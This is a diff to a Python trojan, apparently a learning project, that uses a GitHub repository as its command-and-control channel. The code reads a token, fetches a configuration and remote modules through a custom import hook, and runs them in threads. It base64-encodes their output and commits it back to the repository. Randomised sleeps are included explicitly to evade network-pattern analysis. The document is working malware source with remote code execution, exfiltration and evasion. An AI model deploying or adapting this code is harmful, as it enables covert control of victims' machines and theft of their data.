@@ -10,13 +10,16 @@ import time # Used to add a delay to the requests.
 
 from datetime import datetime # Handles date and time related operations.
 
+TIMESTART = time.time()
+TIMEOUT = 30 # Defines the length of how long the program will run (time is in seconds).
+
 # Connects to a specified GitHub repository.
 def github_connect():
     with open('mytoken.txt') as f: # Stores the personal access token from the file to a variable.
         token = f.read()
     user = '404-riichi-nomi-500' # GitHub's username.
     sess = github3.login(token=token) # Personal access token.
-    return sess.repository(user, 'third-time-the-charm') # Returns the personal access token, username, and the specified repository.
+    return sess.repository(user, 'learning-git-trojan') # Returns the personal access token, username, and the specified repository.
 
 # Retrieves the contents of a file from the GitHub repository.
 # This will be encoded in base64.
@@ -77,25 +80,31 @@ class Trojan:
     def store_module_result(self, data):
         message = datetime.now().isoformat() # Saves current date/time for the filename.
         remote_path = f'data/{self.id}/{message}.data' # Saves the filepath for the filename.
-        bindata = bytes('%r' % data, 'utf-8') # Converts and save the data as bytes.
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # Saves the file and encodes the data as base64.
+        # Checks to see if data is in bytes or not.
+        if isinstance(data, bytes):
+            self.repo.create_file(remote_path, message, base64.b64encode(data)) # Saves the file and encodes the data as base64.
+        else:
+            bindata = bytes('%r' % data, 'utf-8') # Converts and save the data as bytes.
+            self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # Saves the file and encodes the data as base64.
 
     # Main loop of the trojan to continuously fetch the configuration file and run the modules.
     def run(self):
         while True:
+            print ('[*] Starting modules.') # Message for me saying the trojan has started.
             config = self.get_config() # Retrieves the configuration file from the repository.
             # Runs the modules in seperate threads.
             for task in config:
                 thread = threading.Thread(
                     target=self.module_runner,
                     args=(task['module'],))
-                thread.start()
-                time.sleep(random.randint(1, 10))
-            print ("[*] Sent")
+                thread.start()   
+                time.sleep(10) # Delay between each module starting.
+            time.sleep(5) # Delay to allow the modules to run.
+            print ('[*] Data sent.') # Message for me to know both Modules has finished.
             time.sleep(random.randint(30*60, 3*60*60)) # Puts the trojan to sleep for a random amount of time to attempt to foil any network-pattern analysis.
 
 # Checks if the script is being run directly to start its execution.
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())# Appends GitImporter to sys.meta_path which enables dynamic imports.
-    trojan = Trojan('testing') # Assigns the Trojan class and configuration name 'testing'.
+    trojan = Trojan('logging') # Assigns the Trojan class and configuration name 'logging'.
     trojan.run() # Starts the main execution loop.
